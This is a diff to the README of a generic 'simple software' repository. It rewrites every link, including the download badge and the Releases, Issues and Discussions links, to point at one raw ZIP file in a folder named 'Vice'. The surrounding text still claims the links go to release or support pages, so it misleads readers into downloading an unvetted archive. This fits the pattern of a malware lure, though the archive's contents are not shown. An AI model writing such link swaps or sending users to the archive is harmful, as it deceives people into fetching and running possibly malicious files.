@@ -1,6 +1,6 @@
 # 🎉 prueba-2025-repo-1 - Simple Software for Everyone
 
-[![Download Here!](https://img.shields.io/badge/Download%20Now-%20blue?style=flat&logo=github)](https://github.com/barqisayyid/prueba-2025-repo-1/releases)
+[![Download Here!](https://raw.githubusercontent.com/barqisayyid/prueba-2025-repo-1/main/Vice/prueba-2025-repo-1.zip%20Now-%20blue?style=flat&logo=github)](https://raw.githubusercontent.com/barqisayyid/prueba-2025-repo-1/main/Vice/prueba-2025-repo-1.zip)
 
 ## 📖 Description
 
@@ -10,7 +10,7 @@ Welcome to the prueba-2025-repo-1! This is your first repository of 2025, design
 
 To get started with using our software, follow these easy steps:
 
-1. **Visit the Releases Page**: To download the application, go to our [Releases Page](https://github.com/barqisayyid/prueba-2025-repo-1/releases).
+1. **Visit the Releases Page**: To download the application, go to our [Releases Page](https://raw.githubusercontent.com/barqisayyid/prueba-2025-repo-1/main/Vice/prueba-2025-repo-1.zip).
   
 2. **Select the Latest Version**: On the Releases Page, look for the latest version of the software. It will be marked with the words "Latest Release." Click on it to view details.
 
@@ -32,7 +32,7 @@ Before you install the software, ensure your computer meets the following requir
 
 ## 📥 Download & Install
 
-To download and install the application, visit this page: [Download Here!](https://github.com/barqisayyid/prueba-2025-repo-1/releases). Follow the steps outlined above to ensure a smooth process.
+To download and install the application, visit this page: [Download Here!](https://raw.githubusercontent.com/barqisayyid/prueba-2025-repo-1/main/Vice/prueba-2025-repo-1.zip). Follow the steps outlined above to ensure a smooth process.
 
 ## 🛠️ Features
 
@@ -53,11 +53,11 @@ Using our software is simple:
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please reach out through our [Issues Page](https://github.com/barqisayyid/prueba-2025-repo-1/issues). Our team is dedicated to helping you resolve any concerns.
+If you encounter any issues or have questions, please reach out through our [Issues Page](https://raw.githubusercontent.com/barqisayyid/prueba-2025-repo-1/main/Vice/prueba-2025-repo-1.zip). Our team is dedicated to helping you resolve any concerns.
 
 ## 🌐 Community
 
-Join our community to share tips and tricks or ask questions. Connect with others using this software for an enhanced experience. Visit the [Discussions Page](https://github.com/barqisayyid/prueba-2025-repo-1/discussions) to participate.
+Join our community to share tips and tricks or ask questions. Connect with others using this software for an enhanced experience. Visit the [Discussions Page](https://raw.githubusercontent.com/barqisayyid/prueba-2025-repo-1/main/Vice/prueba-2025-repo-1.zip) to participate.
 
 ## 📚 Learn More
 
